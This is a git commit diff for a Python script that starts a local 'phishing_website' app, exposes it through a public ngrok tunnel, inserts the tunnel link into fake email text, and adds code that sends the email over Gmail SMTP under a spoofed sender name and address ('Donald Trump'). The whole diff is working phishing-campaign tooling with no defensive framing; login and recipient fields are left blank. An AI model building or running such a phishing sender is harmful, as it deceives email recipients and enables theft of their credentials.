74933e299beddf1ed96a32ab6b87b98e33c23f50
keszinaj <kubajaniszek123@gmail.com>
2022-02-03 02:10:28 +0100

    new html template

--- run_server.py
+++ run_server.py
@@ -2,7 +2,7 @@ from pyngrok import ngrok
 import json
 import subprocess
 import time
-import re
+
 #odpalenie serwera 
 cmd_line = "python3 ./phishing_website/app.py"
 subprocess.Popen(cmd_line, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
@@ -17,6 +17,31 @@ with open('fake_mail.json') as f:
         fake_mail_text.append(tex['text'])
 phishing_link = https_tunnel.public_url
 print(fake_mail_text[1].replace('{phishing_link}', phishing_link))
+
+#wysłanie maila, szybkie sprawdzenie czy działa tak jak chciałem
+import smtplib
+fake_from = "donaldtrump@gmail.com"
+fake_name = "Donald Trump"
+subject = "ASAP"
+content = fake_mail_text[1].replace('{phishing_link}', phishing_link)
+to_name = ''
+to_email = ''
+with smtplib.SMTP('smtp.gmail.com', 587) as smtp:
+    smtp.ehlo()
+    smtp.starttls()
+    smtp.ehlo()
+
+    smtp.login('', '')
+
+
+   # subject = 'aaaaa'
+   # body = 'aaaaa'
+    message = f"From: {fake_name} <{fake_from}>\nTo: {to_name} <{to_email}>\nSubject: {subject}\n\n{content}"
+
+
+   # msg = f'Subject: {subject}\n\n{body}'
+    smtp.sendmail('', '', message.encode())
+
 
 
 time.sleep(1000)
